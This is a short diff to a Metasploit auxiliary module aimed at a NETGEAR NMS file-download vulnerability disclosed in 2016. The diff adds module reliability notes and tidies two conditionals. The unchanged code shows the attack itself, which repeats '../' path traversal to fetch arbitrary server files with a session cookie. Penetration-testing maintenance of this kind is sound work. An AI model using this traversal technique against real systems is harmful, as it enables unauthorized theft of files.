@@ -28,7 +28,12 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt'],
           ['URL', 'https://seclists.org/fulldisclosure/2016/Feb/30']
         ],
-        'DisclosureDate' => '2016-02-04'
+        'DisclosureDate' => '2016-02-04',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -166,7 +171,7 @@ class MetasploitModule < Msf::Auxiliary
 
     filepath = datastore['FILEPATH']
     res = download_file(filepath, cookie)
-    if res && res.code == 200 && (res.body.to_s.bytesize != 0 && (res.body.to_s !~ /This file does not exist./) && (res.body.to_s !~ /operation is failed/))
+    if res && res.code == 200 && res.body.to_s.bytesize != 0 && (res.body.to_s !~ /This file does not exist./) && (res.body.to_s !~ /operation is failed/)
       save_file(res.body)
       return
     end
@@ -175,7 +180,7 @@ class MetasploitModule < Msf::Auxiliary
     count = 1
     while count < datastore['DEPTH']
       res = download_file(('../' * count).chomp('/') + filepath, cookie)
-      if res && res.code == 200 && (res.body.to_s.bytesize != 0 && (res.body.to_s !~ /This file does not exist./) && (res.body.to_s !~ /operation is failed/))
+      if res && res.code == 200 && res.body.to_s.bytesize != 0 && (res.body.to_s !~ /This file does not exist./) && (res.body.to_s !~ /operation is failed/)
         save_file(res.body)
         return
       end
